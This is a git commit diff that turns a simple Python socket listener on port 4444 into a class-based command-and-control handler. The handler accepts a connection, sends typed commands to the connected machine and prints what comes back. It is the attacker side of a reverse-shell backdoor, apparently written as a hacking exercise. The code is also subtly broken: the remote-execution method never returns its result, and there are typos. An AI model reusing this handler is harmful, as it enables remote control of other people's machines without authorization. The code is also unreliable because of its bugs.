9ebc51beff41678e8e949437e507e2033250e744
Finn B <finnegolfer@gmail.com>
2018-08-14 18:23:59 -0700

    download change

--- listener.py
+++ listener.py
@@ -1,13 +1,23 @@
-#/usr/bin/python
+#/usr/bin/env python
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bing(("10.0.2.15", 4444))
-listener.listen(0)
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
 
-print("[+] listening for incoming connections")
+        print("[+] listening for incoming connections")
 
-listener.accept()
+        self.connection, adress = listener.accept()
 
-print("[+] Connection established")
+        print("[+] Connection establishedfrom" + str(adress))
+    def execute_remotely(self, command):
+            self.connection.send(command)
+            result =self. connection.recv(1024)
+    def run(self):
+        while True:
+            command = raw_input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
